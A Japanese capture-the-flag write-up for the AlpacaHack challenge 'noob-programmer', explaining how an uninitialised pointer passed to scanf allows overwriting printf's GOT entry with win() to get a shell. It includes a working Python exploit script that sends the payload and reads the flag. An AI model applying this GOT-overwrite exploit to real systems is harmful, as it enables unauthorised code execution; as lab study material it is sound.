# noob-programmer 解法

https://alpacahack.com/daily/challenges/noob-programmer

## 脆弱性

`ask_room_number()`関数で`scanf()`の呼び出しにミスがある:

```c
void ask_room_number() {
    long age;
    printf("Input your room number> ");
    scanf("%ld", age);  // バグ: &age であるべき
    printf("Ok! I'll visit your room!");
}
```

`scanf("%ld", age)`は`age`のアドレスではなく、`age`の値（未初期化）を書き込み先として渡している。  
したがって、`age`の初期値を制御できれば任意のアドレスに書き込みが可能になる。

## スタックレイアウト

`objdump -d chal`で確認
```
show_welcome():
  char name[0x20]  at rbp-0x20

ask_room_number():
  long age         at rbp-0x8
```

両関数は`main()`の同じスタックフレームを共有している。  
`show_welcome()`が終了しても`name[0x18:0x20]`の内容はスタックに残り、`ask_room_number()`の`age`の初期値となる。

## 攻撃手法

1. `name[0x18:0x20]`に`printf@got`(0x404008)を書き込む
2. `scanf()`はこの値を書き込み先アドレスとして使用
3. `win`のアドレス(0x4011b6)を入力して`printf@got`を書き換え
4. 次の`printf()`呼び出しで`win()`にジャンプ → シェル獲得



## エクスプロイト

```python
#!/usr/bin/env python3
import socket
import struct
import time

win_addr = 0x4011b6
printf_got = 0x404008

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('HOST', PORT))

s.recv(1024)  # "Input your name> "

# nameの末尾7バイトにprintf@gotを配置
# fgetsは32バイト読み込むので、24バイトのパディング + 7バイトのアドレス
payload = b'A' * 0x18 + struct.pack('<Q', printf_got)[:7] + b'\n'
s.send(payload)

time.sleep(0.2)
s.recv(1024)  # "Welcome! ..." + "Input your room number> "

# winのアドレスを10進数で入力
s.send(str(win_addr).encode() + b'\n')
time.sleep(0.2)

# シェル取得後、フラグを読み出し
s.send(b'cat flag*\n')
time.sleep(0.5)

print(s.recv(4096).decode())
```

## 実行方法

```bash
python3 exploit_remote.py
```


